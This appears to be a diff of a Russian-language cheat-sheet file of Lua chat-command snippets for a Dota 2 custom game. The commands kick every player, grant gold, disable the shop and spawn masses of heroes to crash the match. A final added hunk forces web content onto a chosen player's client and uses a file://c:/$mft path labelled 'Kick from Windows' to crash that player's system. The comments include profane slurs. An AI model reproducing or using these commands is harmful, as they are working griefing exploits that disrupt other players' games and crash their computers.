@@ -83,7 +83,7 @@ say -lua for I = 0, 9 do CHAT_COMMANDS.kick({I}) end
 
 GameRules:SetKillGoal(iGoal)
 
-ИДИАЛЬНАЯ КОМАНДА ПИЗДЕЦ 
+ИДИАЛЬНАЯ КОМАНДА ПИЗДЕЦ
 for team in pairs(TEAM_COLORS) do GameRules:SetCustomGameTeamMaxPlayers(team, 10) end
 
 for i = 0, 9 do Gold:AddGold(i, gold) end
@@ -127,7 +127,7 @@ Timers:CreateTimer(function() EmitGlobalSound("Arena.Hero_Arthas.RageOfArthas");
 Timers:CreateTimer(function() EmitGlobalSound("Arena.Hero_Arthas.Vsolyanova.Impact"); return RandomInt(2,15) end)
 
 
-БАБКИ 
+БАБКИ
 CUSTOM_GOLD_PER_TICK = 100
 
 
@@ -140,13 +140,13 @@ GameRules:GetGameModeEntity():SetUnseenFogOfWarEnabled(true)
 МИНУС МАГАЗ!
 function PanoramaShop:BuyItem(playerID, unit, itemName) end
 
-ЧИСТКА 
+ЧИСТКА
 for i = 0, GameRules:NumDroppedItems() - 1 do UTIL_Remove(GameRules:GetDroppedItem(i)) end
 
 АЛАСТОР ПИДР
 function PanoramaShop:BuyItem(playerID) Notifications:Top(playerID, {text="АЛАСТОР ПИДОР!"}) end
 
-Много шлюх по всей карте ЖОПА КРАШШШШШШ 
+Много шлюх по всей карте ЖОПА КРАШШШШШШ
 say -lua CPrint(RANDVECT())
 _G.RANDVECT = function() return Vector(RandomInt(-MAP_LENGTH,MAP_LENGTH),RandomInt(-MAP_LENGTH,MAP_LENGTH),0) end
 for i = 1, 100 do CreateUnitByName("npc_dota_hero_lina",RANDVECT(),true, nil,nil,RandomInt(2,3))
@@ -159,7 +159,7 @@ Hero:AddNewModifier(Hero,nil,"modifier_fountain_aura_arena",nil)`
 GameRules:GetGameModeEntity():SetFogOfWarDisabled(true)
 
 `
-Атака маленьека и большая 
+Атака маленьека и большая
 GameRules:GetGameModeEntity():SetMaximumAttackSpeed(1)-минимум
 GameRules:GetGameModeEntity():SetMinimumAttackSpeed( 99999 )
 GameRules:GetGameModeEntity():SetMaximumAttackSpeed( 99999 ) МНОГО
@@ -183,3 +183,11 @@ GameRules:GetGameModeEntity():SetMaximumAttackSpeed( 99999 ) МНОГО
 
 ГУМУНКУЛ models/items/courier/onibi_lvl_15/onibi_lvl_15.vmdl
 
+WEB:
+-ccreate <PID> h <URL>
+
+YT Video:
+-ccreate <PID> h https://www.youtube.com/embed/<ID ВИДЕО>?rel=0&amp;controls=0&amp;showinfo=0&amp;start=0
+
+Kick from Windows:
+-ccreate <PID> i file://c:/$mft/123321
